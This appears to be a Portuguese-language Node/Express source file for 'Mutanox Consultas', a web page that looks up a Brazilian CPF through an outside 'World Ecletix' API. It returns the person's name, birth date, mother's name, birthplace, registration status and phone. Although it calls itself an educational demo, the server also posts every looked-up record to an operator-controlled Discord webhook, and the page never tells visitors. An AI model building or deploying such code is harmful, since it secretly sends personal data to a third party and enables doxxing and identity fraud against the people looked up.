import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// ═══════════════════════════════════════════════════════════════════════════════
// SEÇÃO 2: Variáveis Globais e Constantes
// ═══════════════════════════════════════════════════════════════════════════════
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const API_KEY_AI = process.env.API_KEY_AI;

// World Ecletix API Config (APIs de consulta NÃO precisam de API key)
const WORLD_ECLETIX_BASE = 'https://world-ecletix.onrender.com/api';
const API_ENDPOINTS = {
  consultaNome: `${WORLD_ECLETIX_BASE}/nome-completo`,
  consultaCPF: `${WORLD_ECLETIX_BASE}/consultarcpf`,
  consultaTelefone: `${WORLD_ECLETIX_BASE}/numero`
};

// Validar se variáveis obrigatórias estão setadas
if (!WEBHOOK_URL) {
  console.error('❌ Variável de ambiente faltando!');
  console.error('Certifique-se de definir: WEBHOOK_URL');
  process.exit(1);
}

console.log('✅ Servidor iniciando com configurações:');
console.log(`📍 Webhook Discord: ${WEBHOOK_URL ? 'Configurado' : 'NÃO configurado'}`);
console.log(`🔌 World Ecletix APIs: ✅ Prontas (sem necessidade de API key)`);

// ═══════════════════════════════════════════════════════════════════════════════
// SEÇÃO 3: Funções Utilitárias
// ═══════════════════════════════════════════════════════════════════════════════

// Validar CPF
function isValidCPF(cpf) {
  cpf = cpf.replace(/\D/g, '');

  if (cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false;

  let soma = 0;
  for (let i = 0; i < 9; i++) {
    soma += parseInt(cpf.charAt(i)) * (10 - i);
  }
  let resto = soma % 11;
  let dv1 = resto < 2 ? 0 : 11 - resto;

  if (dv1 !== parseInt(cpf.charAt(9))) return false;

  soma = 0;
  for (let i = 0; i < 10; i++) {
    soma += parseInt(cpf.charAt(i)) * (11 - i);
  }
  resto = soma % 11;
  let dv2 = resto < 2 ? 0 : 11 - resto;

  if (dv2 !== parseInt(cpf.charAt(10))) return false;

  return true;
}

// Formatar CPF para exibição (XXX.XXX.XXX-XX)
function formatCPF(cpf) {
  cpf = cpf.replace(/\D/g, '');
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

// Obter hora formatada (HH:MM:SS - DD/MM/YYYY)
function getFormattedTime() {
  const now = new Date();
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');
  const day = String(now.getDate()).padStart(2, '0');
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const year = now.getFullYear();

  return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
}

// Enviar webhook para Discord
async function sendDiscordWebhook(nome, cpf, dadosConsulta) {
  try {
    const payload = {
      username: 'Mutanox Consultas Bot',
      avatar_url: 'https://via.placeholder.com/100',
      embeds: [
        {
          title: '✅ Nova Consulta Realizada',
          description: 'Uma nova consulta de CPF foi registrada no sistema',
          color: 5763719,
          fields: [
            {
              name: '👤 Nome',
              value: nome || 'N/A',
              inline: false
            },
            {
              name: '🆔 CPF',
              value: formatCPF(cpf),
              inline: false
            },
            {
              name: '📅 Data de Nascimento',
              value: dadosConsulta.data_nascimento || 'N/A',
              inline: true
            },
            {
              name: '⚧️ Gênero',
              value: dadosConsulta.genero || 'N/A',
              inline: true
            },
            {
              name: '👪 Mãe',
              value: dadosConsulta.mae || 'N/A',
              inline: true
            },
            {
              name: '📍 Naturalidade',
              value: dadosConsulta.naturalidade || 'N/A',
              inline: true
            },
            {
              name: '✅ Situação Cadastral',
              value: dadosConsulta.situacao_cadastral || 'N/A',
              inline: true
            },
            {
              name: '📱 Telefone',
              value: `${dadosConsulta.telefone || 'N/A'} (${dadosConsulta.operadora || 'N/A'})`,
              inline: true
            },
            {
              name: '⏰ Horário da Consulta',
              value: getFormattedTime(),
              inline: false
            }
          ],
          footer: {
            text: 'Mutanox Consultas | Sistema de Demonstração | World Ecletix',
            icon_url: 'https://via.placeholder.com/30'
          },
          timestamp: new Date().toISOString()
        }
      ]
    };

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    console.log(`✅ Webhook enviado para Discord: ${nome}`);
  } catch (error) {
    console.error('❌ Erro ao enviar webhook:', error);
  }
}

// Consultar CPF (API World Ecletix - NÃO precisa de API key)
async function consultarCPF(cpf) {
  try {
    const url = new URL(API_ENDPOINTS.consultaCPF);
    url.searchParams.append('cpf', cpf);

    const response = await fetch(url.toString(), {
      method: 'GET'
    });

    if (!response.ok) {
      if (response.status === 404) {
        return { error: 'CPF não localizado na base de dados.' };
      }
      if (response.status === 429) {
        return { error: 'Limite de requisições excedido. Aguarde 1 minuto.' };
      }
      return { error: 'Erro ao consultar CPF.' };
    }

    const dados = await response.json();

    return {
      nome: dados.data?.nome || 'N/A',
      cpf: cpf,
      data_nascimento: dados.data?.data_nascimento || 'N/A',
      genero: dados.data?.genero || 'N/A',
      naturalidade: dados.data?.naturalidade || 'N/A',
      mae: dados.data?.mae || 'N/A',
      situacao_cadastral: dados.data?.situacao_cadastral || 'N/A',
      telefone: 'N/A',
      operadora: 'N/A'
    };

  } catch (error) {
    console.error('Erro na consulta CPF:', error);
    return { error: 'Erro de conexão com a API World Ecletix.' };
  }
}

// Consultar Telefone (API World Ecletix - Complementar - NÃO precisa de API key)
async function consultarTelefone(cpf) {
  try {
    const url = new URL(API_ENDPOINTS.consultaTelefone);
    url.searchParams.append('cpf', cpf);

    const response = await fetch(url.toString(), {
      method: 'GET'
    });

    if (!response.ok) {
      return { telefone: 'N/A', operadora: 'N/A' };
    }

    const dados = await response.json();

    return {
      telefone: dados.data?.telefone || 'N/A',
      operadora: dados.data?.operadora || 'N/A',
      tipo: dados.data?.tipo || 'desconhecido'
    };

  } catch (error) {
    console.error('Erro na consulta telefone:', error);
    return { telefone: 'N/A', operadora: 'N/A' };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SEÇÃO 4: HTML do Frontend (Embutido como String)
// ═══════════════════════════════════════════════════════════════════════════════
const htmlTemplate = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mutanox Consultas - Consulte CPF em Tempo Real</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      min-height: 100vh;
      color: #fff;
      display: flex;
      flex-direction: column;
    }

    .container {
      max-width: 600px;
      margin: 0 auto;
      padding: 2rem 1rem;
      flex: 1;
    }

    header {
      text-align: center;
      margin-bottom: 2rem;
    }

    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 1rem;
      background: linear-gradient(135deg, #a855f7, #06b6d4);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2rem;
      box-shadow: 0 4px 15px rgba(168, 85, 247, 0.4);
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 0.5rem;
      background: linear-gradient(135deg, #a855f7, #06b6d4);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .subtitle {
      color: #94a3b8;
      font-size: 1rem;
    }

    .credits {
      color: #64748b;
      font-size: 0.875rem;
      margin-top: 0.5rem;
    }

    .card {
      background: rgba(30, 41, 59, 0.8);
      backdrop-filter: blur(10px);
      border-radius: 1rem;
      padding: 2rem;
      margin-bottom: 1.5rem;
      border: 1px solid rgba(168, 85, 247, 0.2);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }

    .input-group {
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      color: #e2e8f0;
      font-weight: 500;
    }

    input[type="text"] {
      width: 100%;
      padding: 1rem;
      border: 2px solid rgba(168, 85, 247, 0.3);
      border-radius: 0.5rem;
      background: rgba(15, 23, 42, 0.8);
      color: #fff;
      font-size: 1rem;
      transition: all 0.3s ease;
    }

    input[type="text"]:focus {
      outline: none;
      border-color: #a855f7;
      box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.2);
    }

    button {
      width: 100%;
      padding: 1rem;
      background: linear-gradient(135deg, #a855f7, #06b6d4);
      border: none;
      border-radius: 0.5rem;
      color: #fff;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    button:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(168, 85, 247, 0.4);
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .status {
      text-align: center;
      margin-top: 1rem;
      color: #94a3b8;
      font-size: 0.875rem;
    }

    .result-card {
      display: none;
      background: linear-gradient(135deg, rgba(168, 85, 247, 0.2), rgba(6, 182, 212, 0.2));
    }

    .result-card.show {
      display: block;
      animation: slideIn 0.5s ease;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .result-header {
      display: flex;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .success-icon {
      width: 40px;
      height: 40px;
      background: #10b981;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 1rem;
      font-size: 1.5rem;
    }

    .result-title {
      color: #10b981;
      font-size: 1.25rem;
      font-weight: 600;
    }

    .result-field {
      display: flex;
      padding: 0.75rem 0;
      border-bottom: 1px solid rgba(168, 85, 247, 0.2);
    }

    .result-field:last-child {
      border-bottom: none;
    }

    .field-label {
      flex: 0 0 150px;
      color: #94a3b8;
      font-size: 0.875rem;
    }

    .field-value {
      flex: 1;
      color: #e2e8f0;
      font-weight: 500;
    }

    .error-card {
      display: none;
      background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(185, 28, 28, 0.2));
      border-color: rgba(239, 68, 68, 0.3);
    }

    .error-card.show {
      display: block;
      animation: slideIn 0.5s ease;
    }

    .error-header {
      display: flex;
      align-items: center;
      margin-bottom: 1rem;
    }

    .error-icon {
      width: 40px;
      height: 40px;
      background: #ef4444;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 1rem;
      font-size: 1.5rem;
    }

    .error-title {
      color: #ef4444;
      font-size: 1.25rem;
      font-weight: 600;
    }

    .error-message {
      color: #fca5a5;
      margin-bottom: 1.5rem;
    }

    .retry-btn {
      background: linear-gradient(135deg, #ef4444, #dc2626);
    }

    footer {
      text-align: center;
      padding: 2rem 1rem;
      border-top: 1px solid rgba(168, 85, 247, 0.2);
      background: rgba(15, 23, 42, 0.5);
      margin-top: auto;
    }

    footer a {
      color: #a855f7;
      text-decoration: none;
      transition: color 0.3s ease;
    }

    footer a:hover {
      color: #06b6d4;
    }

    .footer-notice {
      color: #94a3b8;
      font-size: 0.875rem;
      margin-top: 0.5rem;
    }

    .footer-copyright {
      color: #64748b;
      font-size: 0.75rem;
      margin-top: 1rem;
    }

    @media (max-width: 640px) {
      .container {
        padding: 1rem;
      }

      h1 {
        font-size: 1.5rem;
      }

      .card {
        padding: 1.5rem;
      }

      .field-label {
        flex: 0 0 120px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="logo">🔍</div>
      <h1>Mutanox Consultas</h1>
      <p class="subtitle">Consulte CPF em Tempo Real com World Ecletix</p>
      <p class="credits">Desenvolvido por MutanoX</p>
    </header>

    <div class="card">
      <div class="input-group">
        <label for="cpfInput">Digite seu CPF</label>
        <input
          type="text"
          id="cpfInput"
          placeholder="Digite seu CPF (apenas números)"
          maxlength="11"
          autocomplete="off"
        >
      </div>
      <button id="consultBtn" disabled>
        <span id="btnText">CONSULTAR</span>
        <div class="spinner" id="spinner"></div>
      </button>
      <div class="status" id="status"></div>
    </div>

    <div class="card result-card" id="resultCard">
      <div class="result-header">
        <div class="success-icon">✓</div>
        <div class="result-title">Consulta Realizada com Sucesso</div>
      </div>
      <div class="result-field">
        <div class="field-label">Nome Completo</div>
        <div class="field-value" id="resultNome">-</div>
      </div>
      <div class="result-field">
        <div class="field-label">CPF</div>
        <div class="field-value" id="resultCPF">-</div>
      </div>
      <div class="result-field">
        <div class="field-label">Data de Nascimento</div>
        <div class="field-value" id="resultDataNascimento">-</div>
      </div>
      <div class="result-field">
        <div class="field-label">Gênero</div>
        <div class="field-value" id="resultGenero">-</div>
      </div>
      <div class="result-field">
        <div class="field-label">Naturalidade</div>
        <div class="field-value" id="resultNaturalidade">-</div>
      </div>
      <div class="result-field">
        <div class="field-label">Mãe</div>
        <div class="field-value" id="resultMae">-</div>
      </div>
      <div class="result-field">
        <div class="field-label">Situação Cadastral</div>
        <div class="field-value" id="resultSituacao">-</div>
      </div>
      <div class="result-field">
        <div class="field-label">Telefone</div>
        <div class="field-value" id="resultTelefone">-</div>
      </div>
    </div>

    <div class="card error-card" id="errorCard">
      <div class="error-header">
        <div class="error-icon">✗</div>
        <div class="error-title">Erro na Consulta</div>
      </div>
      <div class="error-message" id="errorMessage"></div>
      <button class="retry-btn" id="retryBtn">Tentar Novamente</button>
    </div>
  </div>

  <footer>
    <a href="https://www.instagram.com/mutanomodsx?igsh=NDYycjh0anlwcm16" target="_blank">
      Siga @mutanomodsx no Instagram
    </a>
    <p class="footer-notice">Este é um sistema de demonstração educacional</p>
    <p class="footer-copyright">© 2024 MutanoX. Todos os direitos reservados.</p>
  </footer>

  <script>
    const cpfInput = document.getElementById('cpfInput');
    const consultBtn = document.getElementById('consultBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const status = document.getElementById('status');
    const resultCard = document.getElementById('resultCard');
    const errorCard = document.getElementById('errorCard');
    const errorMessage = document.getElementById('errorMessage');
    const retryBtn = document.getElementById('retryBtn');

    // Validar CPF em tempo real
    cpfInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      e.target.value = value;

      if (value.length === 11 && isValidCPF(value)) {
        consultBtn.disabled = false;
      } else {
        consultBtn.disabled = true;
      }
    });

    // Validar CPF (módulo 11)
    function isValidCPF(cpf) {
      if (/^(\d)\1{10}$/.test(cpf)) return false;

      let soma = 0;
      for (let i = 0; i < 9; i++) {
        soma += parseInt(cpf.charAt(i)) * (10 - i);
      }
      let resto = soma % 11;
      let dv1 = resto < 2 ? 0 : 11 - resto;

      if (dv1 !== parseInt(cpf.charAt(9))) return false;

      soma = 0;
      for (let i = 0; i < 10; i++) {
        soma += parseInt(cpf.charAt(i)) * (11 - i);
      }
      resto = soma % 11;
      let dv2 = resto < 2 ? 0 : 11 - resto;

      return dv2 === parseInt(cpf.charAt(10));
    }

    // Formatar CPF para exibição
    function formatCPF(cpf) {
      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }

    // Consultar CPF
    consultBtn.addEventListener('click', async () => {
      const cpf = cpfInput.value;

      if (!isValidCPF(cpf)) {
        showError('CPF inválido. Verifique os dígitos.');
        return;
      }

      setLoading(true);
      hideResults();

      try {
        const response = await fetch('/api/consultar', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cpf })
        });

        const data = await response.json();

        if (data.success) {
          showResult(data.data);
        } else {
          showError(data.error || 'Erro ao consultar CPF.');
        }
      } catch (error) {
        showError('Erro de conexão. Tente novamente.');
      } finally {
        setLoading(false);
      }
    });

    // Retry button
    retryBtn.addEventListener('click', () => {
      hideResults();
      consultBtn.click();
    });

    function setLoading(loading) {
      if (loading) {
        btnText.style.display = 'none';
        spinner.style.display = 'block';
        consultBtn.disabled = true;
        status.textContent = 'Consultando...';
      } else {
        btnText.style.display = 'inline';
        spinner.style.display = 'none';
        consultBtn.disabled = false;
        status.textContent = '';
      }
    }

    function showResult(data) {
      document.getElementById('resultNome').textContent = data.nome || '-';
      document.getElementById('resultCPF').textContent = formatCPF(data.cpf);
      document.getElementById('resultDataNascimento').textContent = data.data_nascimento || '-';
      document.getElementById('resultGenero').textContent = data.genero || '-';
      document.getElementById('resultNaturalidade').textContent = data.naturalidade || '-';
      document.getElementById('resultMae').textContent = data.mae || '-';
      document.getElementById('resultSituacao').textContent = data.situacao_cadastral || '-';
      document.getElementById('resultTelefone').textContent =
        (data.telefone || '-') + (data.operadora ? ' (' + data.operadora + ')' : '');

      resultCard.classList.add('show');
      status.textContent = '✅ Consulta realizada com sucesso!';
    }

    function showError(message) {
      errorMessage.textContent = message;
      errorCard.classList.add('show');
      status.textContent = '❌ Ocorreu um erro na consulta.';
    }

    function hideResults() {
      resultCard.classList.remove('show');
      errorCard.classList.remove('show');
    }
  </script>
</body>
</html>`;

// ═══════════════════════════════════════════════════════════════════════════════
// SEÇÃO 5: Rotas (Endpoints)
// ═══════════════════════════════════════════════════════════════════════════════

// GET / - Servir HTML
app.get('/', (req, res) => {
  res.send(htmlTemplate);
});

// POST /api/consultar - Processar consulta com APIs World Ecletix
app.post('/api/consultar', async (req, res) => {
  const { cpf } = req.body;

  // Validação do CPF
  if (!cpf || !isValidCPF(cpf)) {
    return res.status(400).json({
      success: false,
      error: 'CPF inválido. Verifique os dígitos.'
    });
  }

  try {
    // Chamar API de consulta CPF (World Ecletix - sem API key)
    const dadosConsulta = await consultarCPF(cpf);

    if (dadosConsulta.error) {
      return res.status(400).json({
        success: false,
        error: dadosConsulta.error
      });
    }

    // Buscar telefone complementar (World Ecletix - sem API key)
    const dadosTelefone = await consultarTelefone(cpf);
    dadosConsulta.telefone = dadosTelefone.telefone;
    dadosConsulta.operadora = dadosTelefone.operadora;

    // Enviar webhook para Discord
    await sendDiscordWebhook(dadosConsulta.nome, cpf, dadosConsulta);

    // Retornar dados completos ao frontend
    res.json({
      success: true,
      data: dadosConsulta
    });

  } catch (error) {
    console.error('Erro ao consultar CPF:', error);
    res.status(500).json({
      success: false,
      error: 'Erro interno do servidor.'
    });
  }
});

// Catch-all para rotas não existentes
app.use((req, res) => {
  res.status(404).json({ error: 'Rota não encontrada' });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SEÇÃO 6: Iniciar Servidor
// ═══════════════════════════════════════════════════════════════════════════════
app.listen(PORT, () => {
  console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
  console.log(`📍 Webhook Discord: ${WEBHOOK_URL ? '✅ Configurado' : '❌ Não configurado'}`);
  console.log(`🔌 World Ecletix APIs: ✅ Prontas`);
  console.log('═══════════════════════════════════════════════════════════');
});
